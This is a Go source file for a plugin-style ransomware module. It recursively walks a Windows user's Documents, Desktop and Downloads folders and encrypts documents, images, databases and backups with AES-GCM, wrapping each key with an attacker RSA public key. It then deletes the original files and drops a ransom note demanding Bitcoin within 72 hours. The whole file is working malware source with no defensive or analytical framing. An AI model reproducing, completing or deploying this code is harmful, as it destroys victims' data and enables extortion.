package plugins

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/x509"
    "encoding/pem"
    "fmt"
    "io"
    "os"
    "path/filepath"
    "strings"
    "sync"
)

type Ransomware struct {
    publicKey   *rsa.PublicKey
    extensions  []string
    targetDirs  []string
    wg          sync.WaitGroup
    encrypted   int
}

func NewRansomware(publicKeyPEM string) *Ransomware {
    // Parse RSA public key
    block, _ := pem.Decode([]byte(publicKeyPEM))
    pub, _ := x509.ParsePKIXPublicKey(block.Bytes)
    
    return &Ransomware{
        publicKey: pub.(*rsa.PublicKey),
        extensions: []string{".txt", ".doc", ".docx", ".xls", ".xlsx", 
            ".pdf", ".jpg", ".png", ".csv", ".db", ".sqlite", ".bak"},
        targetDirs: []string{
            os.Getenv("USERPROFILE") + "\\Documents",
            os.Getenv("USERPROFILE") + "\\Desktop",
            os.Getenv("USERPROFILE") + "\\Downloads",
        },
        encrypted: 0,
    }
}

func (r *Ransomware) Start() {
    fmt.Println("[*] Ransomware module activated")
    
    for _, dir := range r.targetDirs {
        r.wg.Add(1)
        go r.encryptDirectory(dir)
    }
    
    r.wg.Wait()
    r.dropReadme()
    fmt.Printf("[+] Encrypted %d files\n", r.encrypted)
}

func (r *Ransomware) encryptDirectory(dir string) {
    defer r.wg.Done()
    
    filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
        if err != nil || info.IsDir() {
            return nil
        }
        
        // Check if file extension matches target
        ext := strings.ToLower(filepath.Ext(path))
        for _, targetExt := range r.extensions {
            if ext == targetExt {
                r.encryptFile(path)
                break
            }
        }
        return nil
    })
}

func (r *Ransomware) encryptFile(path string) {
    // Read file
    plaintext, err := os.ReadFile(path)
    if err != nil {
        return
    }
    
    // Generate AES key
    aesKey := make([]byte, 32)
    rand.Read(aesKey)
    
    // Encrypt file with AES
    block, _ := aes.NewCipher(aesKey)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, 12)
    rand.Read(nonce)
    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    
    // Encrypt AES key with RSA
    encryptedKey, _ := rsa.EncryptPKCS1v15(rand.Reader, r.publicKey, aesKey)
    
    // Write encrypted file with key header
    output := append(encryptedKey, ciphertext...)
    os.WriteFile(path+".encrypted", output, 0600)
    os.Remove(path)
    
    r.encrypted++
}

func (r *Ransomware) dropReadme() {
    readme := `========================================
    YOUR FILES HAVE BEEN ENCRYPTED
========================================

All your important documents, photos, and databases 
have been encrypted with AES-256.

To recover your files, you must pay 0.5 Bitcoin to:

    BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, contact us at: recover@churchofmalware.org

You have 72 hours before the decryption key is destroyed.

========================================
           Church of Malware
========================================`
    
    for _, dir := range r.targetDirs {
        os.WriteFile(dir+"\\README_FOR_DECRYPT.txt", []byte(readme), 0644)
    }
}
